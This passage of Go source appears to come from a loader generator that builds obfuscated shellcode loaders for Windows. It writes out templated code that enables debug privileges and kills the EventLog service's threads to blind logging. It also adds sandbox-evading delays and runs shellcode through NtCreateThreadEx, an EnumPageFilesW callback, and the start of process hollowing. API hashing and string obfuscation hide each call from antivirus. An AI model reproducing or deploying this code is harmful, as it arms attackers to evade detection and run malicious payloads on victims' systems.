  {{.Vars.LookupPrivilegeValue}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("LookupPrivilegeValueW", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.AdjustTokenPrivileges}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("AdjustTokenPrivileges", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      elevate_process_token_func = elevate_process_token_func + `
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.advapi32}} := windows.NewLazyDLL(` + ObfuscateStr("advapi32.dll", str_obfs) + `)

  {{.Vars.GetCurrentProcess}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetCurrentProcess", str_obfs) + `)
  {{.Vars.GetLastError}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetLastError", str_obfs) + `)
  {{.Vars.OpenProcessToken}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("OpenProcessToken", str_obfs) + `)
  {{.Vars.LookupPrivilegeValue}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("LookupPrivilegeValueW", str_obfs) + `)
  {{.Vars.AdjustTokenPrivileges}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("AdjustTokenPrivileges", str_obfs) + `)
`
    }

    elevate_process_token_func = elevate_process_token_func + `
  {{.Vars.currentProcess}}, _, _ := {{.Vars.GetCurrentProcess}}.Call()

  {{.Vars.result}}, _, {{.Vars.err}} := {{.Vars.OpenProcessToken}}.Call({{.Vars.currentProcess}}, {{.Vars.tokenAdjustPrivileges}}|{{.Vars.tokenQuery}}, uintptr(unsafe.Pointer(&{{.Vars.hToken}})))
  if {{.Vars.result}} != 1 {
    return {{.Vars.err}}
  }

  var {{.Vars.tkp}} TokenPrivileges

  {{.Vars.result}}, _, {{.Vars.err}} = {{.Vars.LookupPrivilegeValue}}.Call(uintptr(0), uintptr(unsafe.Pointer(windows.StringToUTF16Ptr({{.Vars.SeDebugPrivilege}}))), uintptr(unsafe.Pointer(&({{.Vars.tkp}}.privileges[0].luid))))
  if {{.Vars.result}} != 1 {
    return {{.Vars.err}}
  }

  const {{.Vars.SePrivilegeEnabled}} uint32 = 0x00000002

  {{.Vars.tkp}}.privilegeCount = 1
  {{.Vars.tkp}}.privileges[0].attributes = {{.Vars.SePrivilegeEnabled}}

  {{.Vars.result}}, _, {{.Vars.err}} = {{.Vars.AdjustTokenPrivileges}}.Call({{.Vars.hToken}}, 0, uintptr(unsafe.Pointer(&{{.Vars.tkp}})), 0, uintptr(0), 0)
  if {{.Vars.result}} != 1 {
    return {{.Vars.err}}
  }

  {{.Vars.result}}, _, _ = {{.Vars.GetLastError}}.Call()
  if {{.Vars.result}} != 0 {
    return {{.Vars.err}}
  }

  return nil
}
`

    event_log_pid_func := `
func {{.Vars.get_eventlog_pid_func}}() (uint32, error) {
`

    if (hashing) {
      event_log_pid_func = event_log_pid_func + `
  {{.Vars.OpenSCManager}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("OpenSCManagerW", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.OpenService}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("OpenServiceW", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.QueryServiceStatusEx}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("QueryServiceStatusEx", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      event_log_pid_func = event_log_pid_func + `
  {{.Vars.advapi32}} := windows.NewLazyDLL(` + ObfuscateStr("advapi32.dll", str_obfs) + `)

  {{.Vars.OpenSCManager}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("OpenSCManagerW", str_obfs) + `)
  {{.Vars.OpenService}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("OpenServiceW", str_obfs) + `)
  {{.Vars.QueryServiceStatusEx}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("QueryServiceStatusEx", str_obfs) + `)
`
    }

    event_log_pid_func = event_log_pid_func + `
  var {{.Vars.ssp}} windows.SERVICE_STATUS_PROCESS
  var {{.Vars.dwBytesNeeded}} uint32

  {{.Vars.scm}}, _, {{.Vars.err}} := {{.Vars.OpenSCManager}}.Call(0, 0, windows.SERVICE_QUERY_STATUS)
  if {{.Vars.scm}} == 0 {
    return 0, {{.Vars.err}}
  }

  {{.Vars.svc}}, _, {{.Vars.err}} := {{.Vars.OpenService}}.Call({{.Vars.scm}}, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(` + ObfuscateStr("EventLog", str_obfs) + `))), windows.SERVICE_QUERY_STATUS)
  if {{.Vars.svc}} == 0 {
    return 0, {{.Vars.err}}
  }

  {{.Vars.QueryServiceStatusEx}}.Call({{.Vars.svc}}, windows.SC_STATUS_PROCESS_INFO, uintptr(unsafe.Pointer(&{{.Vars.ssp}})), uintptr(unsafe.Sizeof({{.Vars.ssp}})), uintptr(unsafe.Pointer(&{{.Vars.dwBytesNeeded}})))

  return {{.Vars.ssp}}.ProcessId, nil
}
`

    phantom_func := `
func {{.Vars.phantom_func}}({{.Vars.pid}} uint32) error {
  {{.Vars.err}} := {{.Vars.elevate_process_token_func}}()
  if {{.Vars.err}} != nil {
    return {{.Vars.err}}
  }
`

    if (hashing) {
      phantom_func = phantom_func + `
  {{.Vars.NtQueryInformationThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtQueryInformationThread, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.I_QueryTagInformation}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("I_QueryTagInformation", rand_num)) + `, ` + ObfuscateStr("advapi32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.OpenThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("OpenThread", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.OpenProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("OpenProcess", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.TerminateThread}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("TerminateThread", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.CloseHandle}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CloseHandle", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.ReadProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("ReadProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.CreateToolhelp32Snapshot}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("CreateToolhelp32Snapshot", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.Thread32First}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("Thread32First", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.Thread32Next}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("Thread32Next", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      phantom_func = phantom_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
  {{.Vars.NtQueryInformationThread}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtQueryInformationThread, str_obfs) + `)

  {{.Vars.advapi32}} := windows.NewLazyDLL(` + ObfuscateStr("advapi32.dll", str_obfs) + `)
  {{.Vars.I_QueryTagInformation}} := {{.Vars.advapi32}}.NewProc(` + ObfuscateStr("I_QueryTagInformation", str_obfs) + `)

  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.OpenThread}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("OpenThread", str_obfs) + `)
  {{.Vars.OpenProcess}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("OpenProcess", str_obfs) + `)
  {{.Vars.TerminateThread}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("TerminateThread", str_obfs) + `)
  {{.Vars.CloseHandle}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("CloseHandle", str_obfs) + `)
  {{.Vars.ReadProcessMemory}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("ReadProcessMemory", str_obfs) + `)
  {{.Vars.CreateToolhelp32Snapshot}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("CreateToolhelp32Snapshot", str_obfs) + `)
  {{.Vars.Thread32First}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("Thread32First", str_obfs) + `)
  {{.Vars.Thread32Next}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("Thread32Next", str_obfs) + `)
`
    }

    phantom_func = phantom_func + `
  var {{.Vars.hThreads}} uintptr
  {{.Vars.hThreads}}, _, _ = {{.Vars.CreateToolhelp32Snapshot}}.Call(windows.TH32CS_SNAPTHREAD, 0)

  if {{.Vars.hThreads}} == 0 {
    return errors.New(` + ObfuscateStr("An error has occurred calling CreateToolhelp32Snapshot", str_obfs) + `)
  }

  {{.Vars.tbi}} := PTHREAD_BASIC_INFORMATION{}
  {{.Vars.te32}} := windows.ThreadEntry32{}
  {{.Vars.te32}}.Size = uint32(unsafe.Sizeof({{.Vars.te32}}))

  {{.Vars.Thread32First}}.Call({{.Vars.hThreads}}, uintptr(unsafe.Pointer(&{{.Vars.te32}})))

  for true {
    if {{.Vars.te32}}.OwnerProcessID == {{.Vars.pid}} {
      {{.Vars.hEvtThread}}, _, _ := {{.Vars.OpenThread}}.Call(windows.THREAD_QUERY_LIMITED_INFORMATION|windows.THREAD_SUSPEND_RESUME|windows.THREAD_TERMINATE, uintptr(0), uintptr({{.Vars.te32}}.ThreadID))
      if {{.Vars.hEvtThread}} == 0 {
        return errors.New(` + ObfuscateStr("An error has occurred calling OpenThread", str_obfs) + `)
      }

      {{.Vars.NtQueryInformationThread}}.Call(uintptr({{.Vars.hEvtThread}}), 0, uintptr(unsafe.Pointer(&{{.Vars.tbi}})), 0x30, 0)

      {{.Vars.hEvtProcess}}, _, _ := {{.Vars.OpenProcess}}.Call(windows.PROCESS_VM_READ, uintptr(0), uintptr({{.Vars.te32}}.OwnerProcessID))
      if {{.Vars.hEvtProcess}} == 0 {
        return errors.New(` + ObfuscateStr("An error has occurred calling OpenProcess", str_obfs) + `)
      }

      if {{.Vars.tbi}}.pTebBaseAddress != 0 {
        {{.Vars.scTagQuery}} := SC_SERVICE_TAG_QUERY{}

        var {{.Vars.hTag}} byte
        var {{.Vars.pN}} uintptr
        {{.Vars.ReadProcessMemory}}.Call({{.Vars.hEvtProcess}}, {{.Vars.tbi}}.pTebBaseAddress+0x1720, uintptr(unsafe.Pointer(&{{.Vars.hTag}})), unsafe.Sizeof({{.Vars.pN}}), 0)

        {{.Vars.scTagQuery}}.processId = {{.Vars.te32}}.OwnerProcessID
        {{.Vars.scTagQuery}}.serviceTag = uint32({{.Vars.hTag}})

        {{.Vars.I_QueryTagInformation}}.Call(0, 1, uintptr(unsafe.Pointer(&{{.Vars.scTagQuery}})))

        if {{.Vars.scTagQuery}}.pBuffer != nil {
          {{.Vars.TerminateThread}}.Call(uintptr({{.Vars.hEvtThread}}),	0)
        }

        {{.Vars.CloseHandle}}.Call({{.Vars.hEvtThread}})
        {{.Vars.CloseHandle}}.Call({{.Vars.hEvtProcess}})
      }
    }

    _, _, {{.Vars.err}} := {{.Vars.Thread32Next}}.Call({{.Vars.hThreads}}, uintptr(unsafe.Pointer(&{{.Vars.te32}})))
    if {{.Vars.err}} != nil {
      break
    }
  }

  {{.Vars.CloseHandle}}.Call({{.Vars.hThreads}})

  return nil
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(elevate_process_token_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(event_log_pid_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(phantom_func, Main))
  }

  // add sleep function to loader
  if (sleep_time) {
    if (verbose) {
      fmt.Println("  > Adding custom sleep function...")
      time.Sleep(100 * time.Millisecond)
    }

    Main.Vars["sleep_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["s"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["i"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["j"] = utils.RandomString(utils.RandomInt(9,10))

    // define code using templates
    sleep_func := `
func {{.Vars.sleep_func}}() {
  {{.Vars.s}} := 500000 + ` + strconv.Itoa(utils.RandomInt(1000, 10000)) + `

  for {{.Vars.i}} := 0; {{.Vars.i}} <= {{.Vars.s}}; {{.Vars.i}}++ {
    for {{.Vars.j}} := 2; {{.Vars.j}} <= {{.Vars.i}}/2; {{.Vars.j}}++ {
      if {{.Vars.i}}%{{.Vars.j}} == 0 {
        break
      }
    }
  }
}
`
    // append previous functiom
    functions = utils.AppendString(functions, ParseTemplate(sleep_func, Main))
  }

  if (username != "") {
    imports = utils.AppendString(imports, "os/user")

    Main.Vars["username"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["username_to_check"] = utils.RandomString(utils.RandomInt(9,10))
  }

  if (computername != "") {
    imports = utils.AppendString(imports, "os")

    Main.Vars["computername"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["computername_to_check"] = utils.RandomString(utils.RandomInt(9,10))
  }

  if (verbose) {
    fmt.Println()
  }
  time.Sleep(100 * time.Millisecond)

  // define shellcode execution function
  var execute_shellcode_func string

  fmt.Println("[*] Using " + exec_technique + " technique to execute shellcode")
  time.Sleep(200 * time.Millisecond)

  // first shellcode execution technique
  if exec_technique == "ntcreatethread" || exec_technique == "ntcreatethreadex" {
    imports = utils.AppendSlice(imports, []string{"unsafe", "golang.org/x/sys/windows"})
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["execute_shellcode_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtAllocateVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtWriteVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtCreateThreadEx"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addr"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["hhosthread"] = utils.RandomString(utils.RandomInt(9,10))

    execute_shellcode_func = `
func {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}} []byte) error {
`

    if (hashing) {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.NtAllocateVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtAllocateVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtWriteVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtWriteVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtCreateThreadEx}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtCreateThreadEx, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)

	{{.Vars.NtAllocateVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtAllocateVirtualMemory, str_obfs) + `)
	{{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
	{{.Vars.NtWriteVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtWriteVirtualMemory, str_obfs) + `)
	{{.Vars.NtCreateThreadEx}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtCreateThreadEx, str_obfs) + `)
`
  }

    execute_shellcode_func = execute_shellcode_func + `
  var {{.Vars.addr}} uintptr
  {{.Vars.regionsize}} := uintptr(len({{.Vars.shellcode}}))

  {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtAllocateVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.addr}})), 0, uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if {{.Vars.r1}} != 0 {
    log.Fatal({{.Vars.err}})
	}

	{{.Vars.NtWriteVirtualMemory}}.Call(uintptr(0xffffffffffffffff), {{.Vars.addr}}, uintptr(unsafe.Pointer(&{{.Vars.shellcode}}[0])), {{.Vars.regionsize}}, 0)

	var {{.Vars.oldProtect}} uintptr
	{{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.addr}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
	if {{.Vars.r2}} != 0 {
    log.Fatal({{.Vars.err}})
	}

	var {{.Vars.hhosthread}} uintptr
  {{.Vars.NtCreateThreadEx}}.Call(uintptr(unsafe.Pointer(&{{.Vars.hhosthread}})), 0x1FFFFF, 0, uintptr(0xffffffffffffffff), {{.Vars.addr}}, 0, uintptr(0), 0, 0, 0, 0)

  windows.WaitForSingleObject(windows.Handle(0xffffffffffffffff), windows.INFINITE)

	return nil
}
`

  } else if exec_technique == "suspendedprocess" { // next shellcode execution technique
    imports = utils.AppendSlice(imports, []string{"unsafe", "golang.org/x/sys/windows"})
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["execute_shellcode_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtAllocateVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtWriteVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EnumPageFilesW"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["psapi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["lpBaseAddress"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))

    execute_shellcode_func = `
func {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}} []byte) error {
`

    if (hashing) {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.NtAllocateVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtAllocateVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtWriteVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtWriteVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EnumPageFilesW}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EnumPageFilesW", rand_num)) + `, ` + ObfuscateStr("psapi.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
  {{.Vars.psapi}} := windows.NewLazyDLL(` + ObfuscateStr("psapi.dll", str_obfs) + `)

  {{.Vars.NtAllocateVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtAllocateVirtualMemory, str_obfs) + `)
  {{.Vars.NtWriteVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtWriteVirtualMemory, str_obfs) + `)
  {{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
  {{.Vars.EnumPageFilesW}} := {{.Vars.psapi}}.NewProc(` + ObfuscateStr("EnumPageFilesW", str_obfs) + `)
`
    }

    execute_shellcode_func = execute_shellcode_func + `
  var {{.Vars.lpBaseAddress}} uintptr
  {{.Vars.regionsize}} := len({{.Vars.shellcode}})

  {{.Vars.oldProtect}} := windows.PAGE_READWRITE

  {{.Vars.NtAllocateVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.lpBaseAddress}})), 0, uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

  {{.Vars.NtWriteVirtualMemory}}.Call(uintptr(0xffffffffffffffff), {{.Vars.lpBaseAddress}}, uintptr(unsafe.Pointer(&{{.Vars.shellcode}}[0])), uintptr({{.Vars.regionsize}}), 0)

  {{.Vars.NtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.lpBaseAddress}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))

  {{.Vars.EnumPageFilesW}}.Call({{.Vars.lpBaseAddress}}, 0)

  return nil
}
`

  } else if exec_technique == "processhollowing" { // next shellcode execution technique

    process_mitigation_binary_signature_policy := `
type PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY struct {
  Flags uint32
}
`

    proc_thread_attribute_entry := `
type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}
`

    proc_thread_attribute_list := `
type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}
`

    process_information := `
type ProcessInformation struct {
	Process   uintptr
	Thread    uintptr
	ProcessId uint32
	ThreadId  uint32
}
`

    startup_info_ex := `
type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}
`

    process_basic_information := `
type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       uintptr
	Reserved3       uintptr
	UniquePid       uintptr
	MoreReserved    uintptr
}
`
    
    exports = utils.AppendSlice(exports, []string{process_mitigation_binary_signature_policy, proc_thread_attribute_entry, proc_thread_attribute_list, process_information, startup_info_ex, process_basic_information})
    imports = utils.AppendSlice(imports, []string{"unsafe", "golang.org/x/sys/windows", "encoding/binary"})
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["execute_shellcode_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["proc"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["blockdlls"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["GetProcessHeap"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["HeapAlloc"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["HeapFree"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["InitializeProcThreadAttributeList"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["UpdateProcThreadAttribute"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["CreateProcessA"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ReadProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["WriteProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ResumeThread"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ZwQueryInformationProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pbi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["procThreadAttributeSize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["procHeap"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["attributeList"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["si"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["mitigate"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["nonms"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["cmd"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["returnLength"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pointerSize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["imageBaseAddress"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addressBuffer"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["read"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["imageBaseValue"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["lfaNewPos"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["lfanew"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["entrypointOffset"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["entrypointOffsetPos"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["entrypointRVA"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["entrypointAddress"] = utils.RandomString(utils.RandomInt(9,10))

    execute_shellcode_func = `
func {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}} []byte, {{.Vars.proc}} string, {{.Vars.blockdlls}} bool) error {
`

    if (hashing) {
      execute_shellcode_func = execute_shellcode_func + `
  {{.Vars.GetProcessHeap}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetProcessHeap", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.HeapAlloc}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("HeapAlloc", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.HeapFree}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("HeapFree", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.InitializeProcThreadAttributeList}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("InitializeProcThreadAttributeList", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
